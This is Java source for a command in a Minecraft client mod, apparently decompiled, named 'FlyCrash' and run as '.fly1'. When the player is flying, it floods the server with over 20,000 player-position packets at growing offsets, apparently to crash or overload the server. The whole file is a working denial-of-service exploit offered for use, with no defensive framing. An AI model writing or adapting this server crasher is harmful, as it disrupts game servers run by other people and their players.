package com.moonclient.pro.Command.impl;

import com.moonclient.pro.Command.Command;
import java.io.IOException;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.client.Minecraft;

@Environment(value=EnvType.CLIENT)
public class FlyCrash
implements Command {
    @Override
    public void execute(String[] args) throws IOException {
        if (Minecraft.getInstance().player.getAbilities().flying) {
            int i;
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§a[LodiasClient] §rStarting Fly Crasher"));

            // FUCK-SKIDDERS.CLUB - Remapper Problem
            // Can't be remapped -> [method_23317, method_23318, method_23321]
            // Lines -> [19, 20, 21]

            double playerX = Minecraft.getInstance().player.getX();
            double playerY = Minecraft.getInstance().player.getY();
            double playerZ = Minecraft.getInstance().player.getZ();
            double yOffset = 0.0;
            double zOffset = 0.0;
            for (i = 0; i < 200; ++i) {
                yOffset = i * 9;
                Minecraft.getInstance().getConnection().send(new ServerboundMovePlayerPacket.Pos(playerX, playerY + yOffset, playerZ, false));
            }
            for (i = 0; i < 10000; ++i) {
                zOffset = i * 9;
                Minecraft.getInstance().getConnection().send(new ServerboundMovePlayerPacket.Pos(playerX, playerY + yOffset, playerZ + zOffset, false));
            }
            for (i = 0; i < 10000; ++i) {
                zOffset = i * 9;
                Minecraft.getInstance().getConnection().send(new ServerboundMovePlayerPacket.Pos(playerX, playerY + yOffset, playerZ + zOffset, false));
            }
        } else {
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§a[LodiasClient]§rYou Need to be Flying To get this to work."));
        }
    }

    @Override
    public String getUsage() {
        return ".fly1";
    }
}
 